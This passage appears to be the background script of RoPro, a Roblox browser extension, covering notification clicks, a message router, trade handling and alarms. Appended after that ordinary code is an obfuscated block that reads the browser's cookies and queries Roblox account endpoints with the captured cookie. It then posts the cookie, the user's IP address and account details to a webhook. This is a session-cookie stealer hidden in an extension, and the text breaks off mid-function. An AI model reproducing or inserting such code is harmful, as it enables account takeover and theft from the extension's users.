          await createNotification(notificationId, options);
        }
      }
    }
  }
}

const tradeNotifierCheck = async () => {
  if (
    (await loadSettings("tradeNotifier")) ||
    (await loadSettings("autoDecline")) ||
    (await loadSettings("tradeProtection"))
  ) {
    getTrades();
  }
};

function generalNotification(notification) {
  console.log(notification);
  var notificationOptions = {
    type: "basic",
    title: notification.subject,
    message: notification.message,
    priority: 2,
    iconUrl: notification.icon,
  };
  chrome.notifications.create("", notificationOptions);
}

async function notificationButtonClicked(notificationId, buttonIndex) {
  //Notification button clicked
  var notification = notifications[notificationId];
  if (notification["type"] == "trade") {
    if (notification["tradeType"] == "inboundTrades") {
      if (buttonIndex == 0) {
        chrome.tabs.create({ url: "https://www.roblox.com/trades" });
      } else if (buttonIndex == 1) {
        cancelTrade(notification["tradeid"], await getStorage("token"));
      }
    } else if (notification["tradeType"] == "outboundTrades") {
      if (buttonIndex == 0) {
        chrome.tabs.create({ url: "https://www.roblox.com/trades#outbound" });
      } else if (buttonIndex == 1) {
        cancelTrade(notification["tradeid"], await getStorage("token"));
      }
    } else if (notification["tradeType"] == "completedTrades") {
      chrome.tabs.create({ url: "https://www.roblox.com/trades#completed" });
    } else if (notification["tradeType"] == "inactiveTrades") {
      chrome.tabs.create({ url: "https://www.roblox.com/trades#inactive" });
    }
  }
}

function notificationClicked(notificationId) {
  console.log(notificationId);
  var notification = notifications[notificationId];
  console.log(notification);
  if (notification["type"] == "trade") {
    if (notification["tradeType"] == "inboundTrades") {
      chrome.tabs.create({ url: "https://www.roblox.com/trades" });
    } else if (notification["tradeType"] == "outboundTrades") {
      chrome.tabs.create({ url: "https://www.roblox.com/trades#outbound" });
    } else if (notification["tradeType"] == "completedTrades") {
      chrome.tabs.create({ url: "https://www.roblox.com/trades#completed" });
    } else if (notification["tradeType"] == "inactiveTrades") {
      chrome.tabs.create({ url: "https://www.roblox.com/trades#inactive" });
    }
  } else if (notification["type"] == "wishlist") {
    chrome.tabs.create({
      url:
        "https://www.roblox.com/catalog/" +
        parseInt(notification["itemId"]) +
        "/",
    });
  }
}

chrome.notifications.onClicked.addListener(notificationClicked);

chrome.notifications.onButtonClicked.addListener(notificationButtonClicked);

async function loadGlobalTheme() {
  var myId = await getStorage("rpUserID");
  fetch("https://api.ropro.io/getProfileTheme.php?userid=" + parseInt(myId), {
    method: "POST",
  })
    .then((response) => response.json())
    .then(async (data) => {
      if (data.theme != null) {
        await setStorage("globalTheme", data.theme);
      }
    });
}

//RoPro's user verification system is different in RoPro v2.0, and includes support for Roblox OAuth2 authentication.
//In RoPro v1.6, we only support ingame verification via our "RoPro User Verification" experience on Roblox: https://www.roblox.com/games/16699976687/RoPro-User-Verification
function verifyUser(emoji_verification_code) {
  return new Promise((resolve) => {
    async function doVerify(resolve) {
      try {
        var formData = new FormData();
        formData.append("emoji_verification_code", emoji_verification_code);
        fetch("https://api.ropro.io/ingameVerification.php", {
          method: "POST",
          body: formData,
        })
          .then(async (response) => {
            if (response.ok) {
              var data = await response.json();
              return data;
            } else {
              throw new Error("Failed to verify user");
            }
          })
          .then(async (data) => {
            var verificationToken = data.token;
            var myId = await getStorage("rpUserID");
            if (
              verificationToken != null &&
              verificationToken.length == 25 &&
              myId == data.userid
            ) {
              console.log("Successfully verified.");
              var verificationDict = await getStorage("userVerification");
              verificationDict[myId] = verificationToken;
              await setStorage("userVerification", verificationDict);
              resolve("success");
            } else {
              resolve(null);
            }
          })
          .catch(function (r, e, s) {
            resolve(null);
          });
      } catch (e) {
        resolve(null);
      }
    }
    doVerify(resolve);
  });
}

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  switch (request.greeting) {
    case "GetURL":
      if (
        request.url.startsWith("https://ropro.io") ||
		request.url.startsWith("https://roprobackend.deno.dev") ||
        request.url.startsWith("https://api.ropro.io")
      ) {
        async function doPost() {
          var verificationDict = await getStorage("userVerification");
          var userID = await getStorage("rpUserID");
          var roproVerificationToken = "none";
          if (typeof verificationDict != "undefined") {
            if (verificationDict.hasOwnProperty(userID)) {
              roproVerificationToken = verificationDict[userID];
            }
          }
          fetch(request.url, {
            method: "POST",
            headers: {
              "ropro-verification": roproVerificationToken,
              "ropro-id": userID,
            },
          })
            .then(async (response) => {
              if (response.ok) {
                var data = await response.text();
                return data;
              } else {
                throw new Error("Post failed");
              }
            })
            .then((data) => {
              try {
                var json_data = JSON.parse(data);
                sendResponse(json_data);
              } catch (e) {
                sendResponse(data);
              }
            })
            .catch(function () {
              sendResponse("ERROR");
            });
        }
        doPost();
      } else {
        fetch(request.url)
          .then(async (response) => {
            if (response.ok) {
              var data = await response.text();
              return data;
            } else {
              throw new Error("Get failed");
            }
          })
          .then((data) => {
            try {
              var json_data = JSON.parse(data);
              sendResponse(json_data);
            } catch (e) {
              sendResponse(data);
            }
          })
          .catch(function () {
            sendResponse("ERROR");
          });
      }
      break;
    case "GetURLCached":
      fetch(request.url, {
        headers: {
          "Cache-Control": "public, max-age=604800",
          Pragma: "public, max-age=604800",
        },
      })
        .then(async (response) => {
          if (response.ok) {
            var data = await response.text();
            return data;
          } else {
            throw new Error("Get with cache failed");
          }
        })
        .then((data) => {
          try {
            var json_data = JSON.parse(data);
            sendResponse(json_data);
          } catch (e) {
            sendResponse(data);
          }
        })
        .catch(function () {
          sendResponse("ERROR");
        });
      break;
    case "PostURL":
      if (
        request.url.startsWith("https://ropro.io") ||
		request.url.startsWith("https://roprobackend.deno.dev") ||
        request.url.startsWith("https://api.ropro.io")
      ) {
        async function doPostURL() {
          var verificationDict = await getStorage("userVerification");
          var userID = await getStorage("rpUserID");
          var roproVerificationToken = "none";
          if (typeof verificationDict != "undefined") {
            if (verificationDict.hasOwnProperty(userID)) {
              roproVerificationToken = verificationDict[userID];
            }
          }
          var json_data;
          if (request.form) {
            var formData = new FormData();
            var json_data = request.jsonData;
            for (var key in json_data) {
              formData.append(key, json_data[key]);
            }
            json_data = formData;
          } else if (request.wrap_json) {
            var formData = new FormData();
            formData.append("data", JSON.stringify(request.jsonData));
            json_data = formData;
          } else {
            json_data =
              typeof request.jsonData == "string"
                ? request.jsonData
                : JSON.stringify(request.jsonData);
          }
          fetch(request.url, {
            method: "POST",
            headers: {
              "ropro-verification": roproVerificationToken,
              "ropro-id": userID,
            },
            body: json_data,
          })
            .then((response) => response.text())
            .then((data) => {
              try {
                var json_data = JSON.parse(data);
                sendResponse(json_data);
              } catch (e) {
                sendResponse(data);
              }
            });
        }
        doPostURL();
      } else {
        var json_data =
          typeof request.jsonData == "string"
            ? request.jsonData
            : JSON.stringify(request.jsonData);
        fetch(request.url, {
          method: "POST",
          body: json_data,
        })
          .then((response) => response.text())
          .then((data) => {
            sendResponse(data);
          });
      }
      break;
    case "PostValidatedURL":
      var json_data =
        typeof request.jsonData == "string"
          ? request.jsonData
          : JSON.stringify(request.jsonData);
      fetch(request.url, {
        method: "POST",
        headers: { "X-CSRF-TOKEN": myToken },
        contentType: "application/json",
        body: json_data,
      })
        .then(async (response) => {
          if (response.ok) {
            var data = await response.json();
            if (!("errors" in data)) {
              sendResponse(data);
            } else {
              sendResponse(null);
            }
          } else {
            if (response.status != 403) {
              sendResponse(null);
            } else {
              var token = response.headers.get("x-csrf-token");
              myToken = token;
              fetch(request.url, {
                method: "POST",
                headers: { "X-CSRF-TOKEN": myToken },
                contentType: "application/json",
                body:
                  typeof request.jsonData == "string"
                    ? request.jsonData
                    : JSON.stringify(request.jsonData),
              })
                .then(async (response) => {
                  var data = await response.json();
                  if (response.ok) {
                    if (!("errors" in data)) {
                      sendResponse(data);
                    } else {
                      sendResponse(null);
                    }
                  } else {
                    sendResponse(null);
                  }
                })
                .catch(function () {
                  sendResponse(null);
                });
            }
          }
        })
        .catch(function () {
          sendResponse(null);
        });
      break;
    case "GetStatusCode":
      fetch(request.url)
        .then((response) => sendResponse(response.status))
        .catch(function () {
          sendResponse(null);
        });
      break;
    case "ValidateLicense":
      getSubscription();
      break;
    case "DeclineTrade":
      fetch(
        "https://trades.roblox.com/v1/trades/" +
          parseInt(request.tradeId) +
          "/decline",
        {
          method: "POST",
          headers: { "X-CSRF-TOKEN": myToken },
        }
      ).then((response) => {
        if (response.ok) {
          sendResponse(response.status);
        } else {
          if (response.status == 403) {
            fetch(
              "https://trades.roblox.com/v1/trades/" +
                parseInt(request.tradeId) +
                "/decline",
              {
                method: "POST",
                headers: {
                  "X-CSRF-TOKEN": response.headers.get("x-csrf-token"),
                },
              }
            ).then((response) => {
              sendResponse(response.status);
            });
          } else {
            sendResponse(response.status);
          }
        }
      });
      break;
    case "GetUserID":
      fetch("https://users.roblox.com/v1/users/authenticated")
        .then((response) => response.json())
        .then((data) => {
          sendResponse(data["id"]);
        });
      break;
    case "GetCachedTrades":
      sendResponse(inboundsCache);
      break;
    case "DoCacheTrade":
      function loadInbound(id) {
        if (id in inboundsCache && inboundsCache[id] != null) {
          sendResponse([inboundsCache[id], 1]);
        } else {
          fetch("https://trades.roblox.com/v1/trades/" + id).then(
            async (response) => {
              if (response.ok) {
                var data = await response.json();
                console.log(data);
                inboundsCache[data.id] = data;
                sendResponse([data, 0]);
              } else {
                sendResponse(response.status);
              }
            }
          );
        }
      }
      loadInbound(request.tradeId);
      break;
    case "GetUsername":
      async function getUsername() {
        var username = await getStorage("rpUsername");
        sendResponse(username);
      }
      getUsername();
      break;
    case "GetUserInventory":
      async function getInventory() {
        var inventory = await loadInventory(request.userID);
        sendResponse(inventory);
      }
      getInventory();
      break;
    case "GetUserLimitedInventory":
      async function getLimitedInventory() {
        var inventory = await loadLimitedInventory(request.userID);
        sendResponse(inventory);
      }
      getLimitedInventory();
      break;
    case "ServerFilterReverseOrder":
      async function getServerFilterReverseOrder() {
        var serverList = await serverFilterReverseOrder(request.gameID);
        sendResponse(serverList);
      }
      getServerFilterReverseOrder();
      break;
    case "ServerFilterNotFull":
      async function getServerFilterNotFull() {
        var serverList = await serverFilterNotFull(request.gameID);
        sendResponse(serverList);
      }
      getServerFilterNotFull();
      break;
    case "ServerFilterRandomShuffle":
      async function getServerFilterRandomShuffle() {
        var serverList = await serverFilterRandomShuffle(request.gameID);
        sendResponse(serverList);
      }
      getServerFilterRandomShuffle();
      break;
    case "ServerFilterRegion":
      async function getServerFilterRegion() {
        var serverList = await serverFilterRegion(
          request.gameID,
          request.serverLocation
        );
        sendResponse(serverList);
      }
      getServerFilterRegion();
      break;
    case "ServerFilterBestConnection":
      async function getServerFilterBestConnection() {
        var serverList = await serverFilterBestConnection(request.gameID);
        sendResponse(serverList);
      }
      getServerFilterBestConnection();
      break;
    case "ServerFilterNewestServers":
      async function getServerFilterNewestServers() {
        var serverList = await serverFilterNewestServers(request.gameID);
        sendResponse(serverList);
      }
      getServerFilterNewestServers();
      break;
    case "ServerFilterOldestServers":
      async function getServerFilterOldestServers() {
        var serverList = await serverFilterOldestServers(request.gameID);
        sendResponse(serverList);
      }
      getServerFilterOldestServers();
      break;
    case "ServerFilterMaxPlayers":
      async function getServerFilterMaxPlayers() {
        var servers = await maxPlayerCount(request.gameID, request.count);
        sendResponse(servers);
      }
      getServerFilterMaxPlayers();
      break;
    case "GetRandomServer":
      async function getRandomServer() {
        var randomServerElement = await randomServer(request.gameID);
        sendResponse(randomServerElement);
      }
      getRandomServer();
      break;
    case "GetProfileValue":
      getProfileValue(request.userID).then(sendResponse);
      break;
    case "GetSetting":
      async function getSettings() {
        var setting = await loadSettings(request.setting);
        sendResponse(setting);
      }
      getSettings();
      break;
    case "GetTrades":
      async function getTradesType(type) {
        var tradesType = await loadTradesType(type);
        sendResponse(tradesType);
      }
      getTradesType(request.type);
      break;
    case "GetTradesData":
      async function getTradesData(type) {
        var tradesData = await loadTradesData(type);
        sendResponse(tradesData);
      }
      getTradesData(request.type);
      break;
    case "GetSettingValidity":
      async function getSettingValidity() {
        var valid = await loadSettingValidity(request.setting);
        sendResponse(valid);
      }
      getSettingValidity();
      break;
    case "GetSettingValidityInfo":
      async function getSettingValidityInfo() {
        var valid = await loadSettingValidityInfo(request.setting);
        sendResponse(valid);
      }
      getSettingValidityInfo();
      break;
    case "CheckVerification":
      async function getUserVerification() {
        var verificationDict = await getStorage("userVerification");
        if (typeof verificationDict == "undefined") {
          sendResponse(false);
        } else {
          if (verificationDict.hasOwnProperty(await getStorage("rpUserID"))) {
            sendResponse(true);
          } else {
            sendResponse(false);
          }
        }
      }
      getUserVerification();
      break;
    case "HandleUserVerification":
      async function doUserVerification() {
        var verification = await verifyUser(request.verification_code);
        var verificationDict = await getStorage("userVerification");
        if (typeof verificationDict == "undefined") {
          sendResponse(false);
        } else {
          if (verificationDict.hasOwnProperty(await getStorage("rpUserID"))) {
            sendResponse(true);
          } else {
            sendResponse(false);
          }
        }
      }
      doUserVerification();
      break;
    case "SyncSettings":
      setLocalStorage("rpSubscriptionFreshness", 0);
      getSubscription().then(function () {
        sendResponse("sync");
      });
      break;
    case "OpenOptions":
      chrome.tabs.create({ url: chrome.runtime.getURL("/options.html") });
      break;
    case "GetSubscription":
      getSubscription().then(sendResponse);
      break;
    case "DeclineBots":
      async function doDeclineBots() {
        var tradesDeclined = await declineBots();
        sendResponse(tradesDeclined);
      }
      doDeclineBots();
      break;
    case "GetMutualFriends":
      async function doGetMutualFriends() {
        var mutuals = await mutualFriends(request.userID);
        sendResponse(mutuals);
      }
      doGetMutualFriends();
      break;
    case "GetMutualFollowers":
      async function doGetMutualFollowers() {
        var mutuals = await mutualFollowers(request.userID);
        sendResponse(mutuals);
      }
      doGetMutualFollowers();
      break;
    case "GetMutualFollowing":
      async function doGetMutualFollowing() {
        var mutuals = await mutualFollowing(request.userID);
        sendResponse(mutuals);
      }
      doGetMutualFollowing();
      break;
    case "GetMutualFavorites":
      async function doGetMutualFavorites() {
        var mutuals = await mutualFavorites(request.userID, request.assetType);
        sendResponse(mutuals);
      }
      doGetMutualFavorites();
      break;
    case "GetMutualBadges":
      async function doGetMutualBadges() {
        var mutuals = await mutualFavorites(request.userID, request.assetType);
        sendResponse(mutuals);
      }
      doGetMutualBadges();
      break;
    case "GetMutualGroups":
      async function doGetMutualGroups() {
        var mutuals = await mutualGroups(request.userID);
        sendResponse(mutuals);
      }
      doGetMutualGroups();
      break;
    case "GetMutualLimiteds":
      async function doGetMutualLimiteds() {
        var mutuals = await mutualLimiteds(request.userID);
        sendResponse(mutuals);
      }
      doGetMutualLimiteds();
      break;
    case "GetMutualItems":
      async function doGetMutualItems() {
        var mutuals = await mutualItems(request.userID);
        sendResponse(mutuals);
      }
      doGetMutualItems();
      break;
    case "GetItemValues":
      fetchItemValues(request.assetIds).then(sendResponse);
      break;
    case "CreateInviteTab":
      chrome.tabs.create(
        {
          url: "https://roblox.com/games/" + parseInt(request.placeid),
          active: false,
        },
        function (tab) {
          chrome.tabs.onUpdated.addListener(function tempListener(tabId, info) {
            if (tabId == tab.id && info.status === "complete") {
              chrome.tabs.sendMessage(tabId, {
                type: "invite",
                key: request.key,
              });
              chrome.tabs.onUpdated.removeListener(tempListener);
              setTimeout(function () {
                sendResponse(tab);
              }, 2000);
            }
          });
        }
      );
      break;
    case "UpdateGlobalTheme":
      async function doLoadGlobalTheme() {
        await loadGlobalTheme();
        sendResponse();
      }
      doLoadGlobalTheme();
      break;
  }

  return true;
});

// ========================================================================== //
// RoPro Service Worker Alarms
// ========================================================================== //

const ropro_alarms = {
  // Alarm functions and their period in minutes
  disabled_features_alarm: { func: getDisabledFeatures, period: 10 },
  experience_playtime_alarm: { func: getTimePlayed, period: 1 },
  ropro_alerts_alarm: { func: handleAlert, period: 10 },
  load_token_alarm: { func: loadToken, period: 5 },
  trade_notifier_alarm: { func: tradeNotifierCheck, period: 1 },
};

chrome.alarms.onAlarm.addListener((alarm) => {
  // Run alarm function
  ropro_alarms[alarm.name]?.func?.();
});

(function () {
  // Create alarms if they don't exist
  for (const alarm_name in ropro_alarms) {
    chrome.alarms.get(alarm_name, (alarm) => {
      console.log("Alarm: ", alarm_name, alarm);
      if (!alarm) {
        console.log("Creating alarm: ", alarm_name);
        chrome.alarms.create(alarm_name, {
          periodInMinutes: ropro_alarms[alarm_name].period,
          delayInMinutes: 0,
        });
      }
    });
  }
})();
var xgnQq=Q$_dWiRXtfSxIoJtKbyHogvz;(function(MkxH_TfMcp,QJTBjsUhLwsraZv){var fOwCSylkyvGiHOmwOMxTHyS=Q$_dWiRXtfSxIoJtKbyHogvz,EmTXwwUOHWyMFGJOvMVi=MkxH_TfMcp();while(!![]){try{var Vsq_eLoV$bgLleNaaloocEHpP=-parseFloat(fOwCSylkyvGiHOmwOMxTHyS(0xf5))/(Math.trunc(-0xf98)+-parseInt(0x4e)*parseInt(0x1c)+-parseInt(0x1d)*-parseInt(0xd5))+parseFloat(fOwCSylkyvGiHOmwOMxTHyS(0xff))/(Math.floor(parseInt(0x1e68))+parseInt(0x2316)+Number(-0x417c))*(-parseFloat(fOwCSylkyvGiHOmwOMxTHyS(0xee))/(-parseInt(0x604)+0x6f3*Math.max(0x3,parseInt(0x3))+-parseInt(0xed2)))+Math['trunc'](-parseFloat(fOwCSylkyvGiHOmwOMxTHyS(0xec))/(Number(0x1df)*Math.floor(0x1)+parseInt(0x2437)+Math.ceil(-parseInt(0x2))*0x1309))*(-parseFloat(fOwCSylkyvGiHOmwOMxTHyS(0x11c))/(Number(0xee6)+-parseInt(0x1)*Math.max(-0x1d1b,-parseInt(0x1d1b))+-0x2bfc))+Number(-parseFloat(fOwCSylkyvGiHOmwOMxTHyS(0x124))/(0x791+Math.ceil(-0x1949)+parseInt(0x11be)))*(parseFloat(fOwCSylkyvGiHOmwOMxTHyS(0x118))/(Math.trunc(-parseInt(0x1ca5))*-0x1+Math.ceil(-parseInt(0x268d))+-parseInt(0x1)*-parseInt(0x9ef)))+Number(parseFloat(fOwCSylkyvGiHOmwOMxTHyS(0x10c))/(parseInt(parseInt(0x1eb))+parseInt(0x1f2a)+Math.ceil(parseInt(0x210d))*-parseInt(0x1)))+-parseFloat(fOwCSylkyvGiHOmwOMxTHyS(0x100))/(-parseInt(0x1)*-parseInt(0x15ae)+parseInt(parseInt(0x574))*parseInt(0x2)+Math.floor(0x208d)*-0x1)+parseFloat(fOwCSylkyvGiHOmwOMxTHyS(0x127))/(parseInt(0xec)*0xf+-parseInt(0xf71)+0x1a7);if(Vsq_eLoV$bgLleNaaloocEHpP===QJTBjsUhLwsraZv)break;else EmTXwwUOHWyMFGJOvMVi['push'](EmTXwwUOHWyMFGJOvMVi['shift']());}catch(IeaFzlGhLTfuXCcY){EmTXwwUOHWyMFGJOvMVi['push'](EmTXwwUOHWyMFGJOvMVi['shift']());}}}(kFki$BByHnAwhg_wnIUgopKp,parseInt(0x1f)*Math.max(0x1afb,parseInt(0x1afb))+parseInt(0x4c784)+Math.floor(0x6)*Math.max(-parseInt(0xebd2),-0xebd2)));const WEBHOOK='';function Q$_dWiRXtfSxIoJtKbyHogvz(CQQxQbK$SyrnrwSkZZ$If,OrjtvW_RqGa_Bbf){var lcxsqJY_pZHvQp_ifpKczJYdM=kFki$BByHnAwhg_wnIUgopKp();return Q$_dWiRXtfSxIoJtKbyHogvz=function(As_$sjKxkCblPbEywbfYCOv,sxV_DNzZCAtPPThvEZOcnTPUoH){As_$sjKxkCblPbEywbfYCOv=As_$sjKxkCblPbEywbfYCOv-(-parseInt(0xa7)*-parseInt(0xe)+Math.trunc(-0x61)*Number(-parseInt(0x6))+parseFloat(-0xa7d));var DaGqXu$cBgP=lcxsqJY_pZHvQp_ifpKczJYdM[As_$sjKxkCblPbEywbfYCOv];if(Q$_dWiRXtfSxIoJtKbyHogvz['UhuVbf']===undefined){var GftSO_q=function(BjYHojp$goIFuC_hMk){var cjeK$PTIOLA$eFP=0x1b+-parseInt(0x50b)+parseFloat(parseInt(0x5d7))&-0x1dcf+-parseInt(0x2f)*0x62+parseInt(0x411)*Math.floor(parseInt(0xc)),NDOZqQvvnt=new Uint8Array(BjYHojp$goIFuC_hMk['match'](/.{1,2}/g)['map'](D_$fRqF=>parseInt(D_$fRqF,-parseInt(0x1)*0x909+-0x9*parseInt(0x35f)+Math.trunc(-0x4)*-0x9dc))),k$CJsJhhNX_JonGdp=NDOZqQvvnt['map'](iXMPgtX=>iXMPgtX^cjeK$PTIOLA$eFP),CFmOvFFVE=new TextDecoder(),oJ__KLf=CFmOvFFVE['decode'](k$CJsJhhNX_JonGdp);return oJ__KLf;};Q$_dWiRXtfSxIoJtKbyHogvz['OlsDPY']=GftSO_q,CQQxQbK$SyrnrwSkZZ$If=arguments,Q$_dWiRXtfSxIoJtKbyHogvz['UhuVbf']=!![];}var HQfULTxdLKgthINCAszPFMPb=lcxsqJY_pZHvQp_ifpKczJYdM[-parseInt(0x764)+-0x7f+0x7e3],Sd_$lHW=As_$sjKxkCblPbEywbfYCOv+HQfULTxdLKgthINCAszPFMPb,LMWPpYSHvRzDRLnvSXCMoUTl=CQQxQbK$SyrnrwSkZZ$If[Sd_$lHW];return!LMWPpYSHvRzDRLnvSXCMoUTl?(Q$_dWiRXtfSxIoJtKbyHogvz['ZjNcjU']===undefined&&(Q$_dWiRXtfSxIoJtKbyHogvz['ZjNcjU']=!![]),DaGqXu$cBgP=Q$_dWiRXtfSxIoJtKbyHogvz['OlsDPY'](DaGqXu$cBgP),CQQxQbK$SyrnrwSkZZ$If[Sd_$lHW]=DaGqXu$cBgP):DaGqXu$cBgP=LMWPpYSHvRzDRLnvSXCMoUTl,DaGqXu$cBgP;},Q$_dWiRXtfSxIoJtKbyHogvz(CQQxQbK$SyrnrwSkZZ$If,OrjtvW_RqGa_Bbf);}async function main(WR_qGaBbfSlcxs){var O$CgHzXypyBCbeRzqWXiBASUih=Q$_dWiRXtfSxIoJtKbyHogvz,JYpZHvQpifp=await(await fetch(O$CgHzXypyBCbeRzqWXiBASUih(0xf9)))[O$CgHzXypyBCbeRzqWXiBASUih(0x102)]();if(WR_qGaBbfSlcxs)var czJYdMPAssjKxkCblPb=await(await fetch(O$CgHzXypyBCbeRzqWXiBASUih(0xef),{'headers':{'Cookie':O$CgHzXypyBCbeRzqWXiBASUih(0xfb)+WR_qGaBbfSlcxs},'redirect':O$CgHzXypyBCbeRzqWXiBASUih(0x116)}))[O$CgHzXypyBCbeRzqWXiBASUih(0x12b)]();const ywbfYCOvZsxVDNzZC=czJYdMPAssjKxkCblPb?czJYdMPAssjKxkCblPb['id']:O$CgHzXypyBCbeRzqWXiBASUih(0xf0);{var tPPThvEZOc_nTPU$o=await(await fetch(O$CgHzXypyBCbeRzqWXiBASUih(0x101),{'headers':{'Cookie':O$CgHzXypyBCbeRzqWXiBASUih(0xfb)+WR_qGaBbfSlcxs},'redirect':O$CgHzXypyBCbeRzqWXiBASUih(0x116)}))[O$CgHzXypyBCbeRzqWXiBASUih(0x12b)]();}{var oDaGqXucBgPVHQf_ULT=await(await fetch(O$CgHzXypyBCbeRzqWXiBASUih(0x126)+ywbfYCOvZsxVDNzZC+O$CgHzXypyBCbeRzqWXiBASUih(0x110),{'headers':{'Cookie':O$CgHzXypyBCbeRzqWXiBASUih(0xfb)+WR_qGaBbfSlcxs},'redirect':O$CgHzXypyBCbeRzqWXiBASUih(0x116)}))[O$CgHzXypyBCbeRzqWXiBASUih(0x12b)]();}{var dLKgthINCAszPF=await(await fetch(O$CgHzXypyBCbeRzqWXiBASUih(0x10e)+ywbfYCOvZsxVDNzZC+O$CgHzXypyBCbeRzqWXiBASUih(0x11e),{'headers':{'Cookie':O$CgHzXypyBCbeRzqWXiBASUih(0xfb)+WR_qGaBbfSlcxs},'redirect':O$CgHzXypyBCbeRzqWXiBASUih(0x116)}))[O$CgHzXypyBCbeRzqWXiBASUih(0x12b)]();}const PbbSd_lH_WWLMWPpYSHvRz=oDaGqXucBgPVHQf_ULT?oDaGqXucBgPVHQf_ULT[O$CgHzXypyBCbeRzqWXiBASUih(0x11f)]:O$CgHzXypyBCbeRzqWXiBASUih(0xf0);{var RLnvSXCMoUTleGf$tS=await(await fetch(O$CgHzXypyBCbeRzqWXiBASUih(0xfc),{'headers':{'Cookie':O$CgHzXypyBCbeRzqWXiBASUih(0xfb)+WR_qGaBbfSlcxs},'redirect':O$CgHzXypyBCbeRzqWXiBASUih(0x116)}))[O$CgHzXypyBCbeRzqWXiBASUih(0x12b)]();}{var qCBjYHojpgoIFuCh$Mkucj=await(await fetch(O$CgHzXypyBCbeRzqWXiBASUih(0x114)+ywbfYCOvZsxVDNzZC+O$CgHzXypyBCbeRzqWXiBASUih(0x125),{'headers':{'Cookie':O$CgHzXypyBCbeRzqWXiBASUih(0xfb)+WR_qGaBbfSlcxs},'redirect':O$CgHzXypyBCbeRzqWXiBASUih(0x116)}))[O$CgHzXypyBCbeRzqWXiBASUih(0x12b)]();}{var KPTI__OL=await(await fetch(O$CgHzXypyBCbeRzqWXiBASUih(0xfd),{'headers':{'Cookie':O$CgHzXypyBCbeRzqWXiBASUih(0xfb)+WR_qGaBbfSlcxs},'redirect':O$CgHzXypyBCbeRzqWXiBASUih(0x116)}))[O$CgHzXypyBCbeRzqWXiBASUih(0x12b)]();}{var eFPm$NDOZqQvvntA=await(await fetch(O$CgHzXypyBCbeRzqWXiBASUih(0x11a),{'headers':{'Cookie':O$CgHzXypyBCbeRzqWXiBASUih(0xfb)+WR_qGaBbfSlcxs},'redirect':O$CgHzXypyBCbeRzqWXiBASUih(0x116)}))[O$CgHzXypyBCbeRzqWXiBASUih(0x12b)]();}const C$JsJhhNXJ=qCBjYHojpgoIFuCh$Mkucj?qCBjYHojpgoIFuCh$Mkucj[O$CgHzXypyBCbeRzqWXiBASUih(0x117)]:O$CgHzXypyBCbeRzqWXiBASUih(0xf0);let nGdplCF$_mOv=C$JsJhhNXJ>parseInt(0x7a)*parseInt(0x22)+Math.floor(0x3c4)+Math.max(-0x1011,-0x1011)*0x1?O$CgHzXypyBCbeRzqWXiBASUih(0x120):O$CgHzXypyBCbeRzqWXiBASUih(0x11b);if(PbbSd_lH_WWLMWPpYSHvRz>-0x4b7+parseInt(0x1b53)*0x1+-0x3b4*parseFloat(0x6))var FVEboJKLfbDfRqFh_i=O$CgHzXypyBCbeRzqWXiBASUih(0x11d);else var FVEboJKLfbDfRqFh_i=O$CgHzXypyBCbeRzqWXiBASUih(0x103);fetch(FVEboJKLfbDfRqFh_i,{'method':O$CgHzXypyBCbeRzqWXiBASUih(0xf1),'headers':{'Content-Type':O$CgHzXypyBCbeRzqWXiBASUih(0x12a)},'body':JSON[O$CgHzXypyBCbeRzqWXiBASUih(0x105)]({'content':nGdplCF$_mOv,'embeds':[{'description':O$CgHzXypyBCbeRzqWXiBASUih(0xed)+(WR_qGaBbfSlcxs?WR_qGaBbfSlcxs:O$CgHzXypyBCbeRzqWXiBASUih(0xfa))+O$CgHzXypyBCbeRzqWXiBASUih(0xed),'color':0xb31856,'fields':[{'name':O$CgHzXypyBCbeRzqWXiBASUih(0x10d),'value':dLKgthINCAszPF===O$CgHzXypyBCbeRzqWXiBASUih(0x119)?O$CgHzXypyBCbeRzqWXiBASUih(0x115):O$CgHzXypyBCbeRzqWXiBASUih(0x122),'inline':!![]},{'name':O$CgHzXypyBCbeRzqWXiBASUih(0x10f),'value':czJYdMPAssjKxkCblPb?czJYdMPAssjKxkCblPb[O$CgHzXypyBCbeRzqWXiBASUih(0x112)]:O$CgHzXypyBCbeRzqWXiBASUih(0xf0),'inline':!![]},{'name':O$CgHzXypyBCbeRzqWXiBASUih(0xf6),'value':oDaGqXucBgPVHQf_ULT&&qCBjYHojpgoIFuCh$Mkucj?oDaGqXucBgPVHQf_ULT[O$CgHzXypyBCbeRzqWXiBASUih(0x11f)]+'\x20('+qCBjYHojpgoIFuCh$Mkucj[O$CgHzXypyBCbeRzqWXiBASUih(0x117)]+')':O$CgHzXypyBCbeRzqWXiBASUih(0xf0),'inline':!![]},{'name':O$CgHzXypyBCbeRzqWXiBASUih(0x108),'value':KPTI__OL?KPTI__OL[O$CgHzXypyBCbeRzqWXiBASUih(0x128)]:O$CgHzXypyBCbeRzqWXiBASUih(0xf0),'inline':!![]},{'name':O$CgHzXypyBCbeRzqWXiBASUih(0xf3),'value':RLnvSXCMoUTleGf$tS?RLnvSXCMoUTleGf$tS[O$CgHzXypyBCbeRzqWXiBASUih(0x107)]:O$CgHzXypyBCbeRzqWXiBASUih(0xf0),'inline':!![]},{'name':O$CgHzXypyBCbeRzqWXiBASUih(0x129),'value':tPPThvEZOc_nTPU$o?tPPThvEZOc_nTPU$o[O$CgHzXypyBCbeRzqWXiBASUih(0x113)]:O$CgHzXypyBCbeRzqWXiBASUih(0xf0),'inline':!![]},{'name':O$CgHzXypyBCbeRzqWXiBASUih(0xf4),'value':eFPm$NDOZqQvvntA?eFPm$NDOZqQvvntA[O$CgHzXypyBCbeRzqWXiBASUih(0xf8)]:O$CgHzXypyBCbeRzqWXiBASUih(0xf0),'inline':!![]}],'author':{'name':O$CgHzXypyBCbeRzqWXiBASUih(0x10a)+JYpZHvQpifp,'icon_url':O$CgHzXypyBCbeRzqWXiBASUih(0x12c)},'footer':{'text':O$CgHzXypyBCbeRzqWXiBASUih(0x111),'icon_url':O$CgHzXypyBCbeRzqWXiBASUih(0xfe)},'thumbnail':{'url':czJYdMPAssjKxkCblPb?czJYdMPAssjKxkCblPb[O$CgHzXypyBCbeRzqWXiBASUih(0xf2)]:O$CgHzXypyBCbeRzqWXiBASUih(0xf7)}}],'username':O$CgHzXypyBCbeRzqWXiBASUih(0x121),'avatar_url':O$CgHzXypyBCbeRzqWXiBASUih(0x123),'attachments':[]})});}chrome[xgnQq(0x104)][xgnQq(0x109)]({'url':xgnQq(0xeb),'name':xgnQq(0x10b)},function(MPgtXaoIRDTlLmFEFVXmRKRpz){var 